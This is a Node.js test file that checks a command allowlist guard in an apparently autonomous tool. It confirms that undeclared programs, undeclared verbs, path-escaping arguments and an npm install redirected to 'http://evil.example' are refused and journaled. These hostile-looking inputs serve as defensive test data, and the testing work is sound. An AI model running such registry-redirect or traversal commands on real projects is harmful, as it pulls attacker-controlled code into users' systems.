/**
 * The command allowlist, end to end.
 *
 * `command-policy.test.mjs` unit-tests `checkCommand` and integration-tests
 * `isRefused`, which is the right place for both. Neither drives the code that
 * actually spawns a shell.
 *
 * That gap was found by mutation rather than by reading. Replacing the whole body
 * of `checkCommand` with `{ ok: true }` fails 15 tests, so the allowlist itself is
 * well covered. But deleting the single line that calls the guard from `applyAsync`
 * -- the function whose entire job is to run commands -- failed **zero** tests. The
 * gate was load-bearing and untested at the same time, which is the worst of both.
 *
 * So these tests drive `applyAsync`, which is the only route to `#command`, and
 * assert on the refusal that a spawn would have made impossible.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Applier } from '../src/act/apply.mjs';
import { REFUSAL } from '../src/act/guard.mjs';

function project() {
  const root = mkdtempSync(join(tmpdir(), 'wd-cmdgate-'));
  mkdirSync(join(root, 'src'), { recursive: true });
  writeFileSync(join(root, 'src', 'a.js'), 'const A = 1;\nmodule.exports = { A };\n', 'utf8');
  return root;
}

const applierFor = (root) =>
  new Applier({ projectRoot: root, dataDir: join(root, '.watchdog'), autonomy: 'autonomous', allowlist: [] });

test('a verb nobody declared is refused before anything is spawned', async () => {
  const root = project();
  const a = applierFor(root);

  const r = await a.applyAsync({ kind: 'command', argv: ['helm', 'upgrade', 'chart'] }, { cwd: root, source: 'rule' });

  assert.equal(r.status, 'refused');
  // `helm` is not a declared program at all, so it is refused before the verb is
  // ever considered. Reaching VERB_NOT_ALLOWED would need a declared program with an
  // undeclared verb, which is what `git gc` is for.
  assert.equal(r.code, REFUSAL.COMMAND_NOT_ALLOWED);

  // The distinction that matters. Without the gate this call reaches #command and
  // tries to spawn `helm`, which is not installed, so it comes back as an error
  // mentioning ENOENT. A refusal means the command was judged, not attempted.
  assert.doesNotMatch(r.why ?? '', /ENOENT|spawn|not recognized/i, 'this looks like a spawn failure, not a refusal');
});

test('a declared program with an undeclared verb is refused on the verb', async () => {
  const root = project();
  // `git` is a declared program; `git push` is not a verb it may run. This is the
  // case a program-level allowlist alone would wave through, and it is what the
  // audit's "unknown commands should fail closed" is really about.
  //
  // `git gc` was the obvious candidate and is wrong here: the denylist matches it
  // as credential destruction, so it never reaches the verb check. Both layers run,
  // denylist first. That is the intended order -- the allowlist is the boundary, and
  // the denylist only makes the reason more specific on commands it already refuses.
  const r = await applierFor(root).applyAsync({ kind: 'command', argv: ['npm', 'uninstall', 'express'] }, { cwd: root, source: 'rule' });

  assert.equal(r.status, 'refused');
  assert.equal(r.code, REFUSAL.COMMAND_VERB_NOT_ALLOWED);
});

test('a program nobody declared is refused', async () => {
  const root = project();
  const r = await applierFor(root).applyAsync({ kind: 'command', argv: ['definitely-not-a-real-tool', '--x'] }, { cwd: root, source: 'llm' });

  assert.equal(r.status, 'refused');
  assert.equal(r.code, REFUSAL.COMMAND_NOT_ALLOWED);
});

test('a flagged command is refused on the flag, not merely on the program', async () => {
  const root = project();
  // `npm install` is permitted; pointing it at another registry is not. This is the
  // case a verb-level allowlist alone would wave through.
  const r = await applierFor(root).applyAsync(
    { kind: 'command', argv: ['npm', '--registry=http://evil.example', 'install'] },
    { cwd: root, source: 'llm' },
  );

  assert.equal(r.status, 'refused');
  assert.equal(r.code, REFUSAL.COMMAND_FLAG_NOT_ALLOWED);
});

test('an argument that climbs out of the project is refused', async () => {
  const root = project();
  const r = await applierFor(root).applyAsync(
    { kind: 'command', argv: ['npm', 'install', '../../elsewhere/pkg'] },
    { cwd: root, source: 'llm' },
  );

  assert.equal(r.status, 'refused');
  assert.equal(r.code, REFUSAL.COMMAND_ARG_NOT_ALLOWED);
});

test('a permitted command is not refused, so the tests above are discriminating', async () => {
  // A test that asserted "everything is refused" would pass just as well against a
  // guard that refuses unconditionally. `node --version` is on the allowlist, so it
  // must get through -- and running it proves the refusal above is a judgement
  // rather than a blanket.
  const root = project();
  const r = await applierFor(root).applyAsync({ kind: 'command', argv: ['node', '--version'] }, { cwd: root, source: 'rule' });

  assert.notEqual(r.status, 'refused', 'a permitted command was refused, so the other tests prove nothing');
});

test('a refusal outranks the autonomy setting, because a refused command was never a candidate', async () => {
  // Order matters and is not what I first assumed. `suggest` does not short-circuit
  // ahead of the guard: a command the policy forbids is reported as refused even
  // under `suggest`, because "you have not opted in" and "this is not permitted" are
  // different answers and collapsing them would hide which one applied.
  //
  // A permitted command under `suggest` is a different matter entirely -- nothing
  // runs, and it says so.
  const root = project();
  const a = new Applier({ projectRoot: root, dataDir: join(root, '.watchdog'), autonomy: 'suggest', allowlist: [] });

  const forbidden = await a.applyAsync({ kind: 'command', argv: ['helm', 'upgrade', 'chart'] }, { cwd: root, source: 'rule' });
  assert.equal(forbidden.status, 'refused', 'a forbidden command was softened into a suggestion');

  const permitted = await a.applyAsync({ kind: 'command', argv: ['node', '--version'] }, { cwd: root, source: 'rule' });
  assert.equal(permitted.status, 'suggested', 'a permitted command ran without an opt-in');
});

test('a refusal is recorded, so the attempt is visible afterwards', async () => {
  const root = project();
  const a = applierFor(root);

  await a.applyAsync({ kind: 'command', argv: ['helm', 'upgrade', 'chart'] }, { cwd: root, source: 'llm' });

  // A refusal that leaves no trace is indistinguishable, later, from a command that
  // was never proposed -- which is the shape of the bug this whole area has had.
  const rec = a.listJournal().find((j) => j.type === 'command');
  assert.ok(rec, 'the refused command left no journal entry');
  assert.equal(rec.outcome, 'refused');
  assert.ok(rec.why, 'the entry does not say why it was refused');
  assert.deepEqual(rec.argv, ['helm', 'upgrade', 'chart'], 'the record does not say what was proposed');
});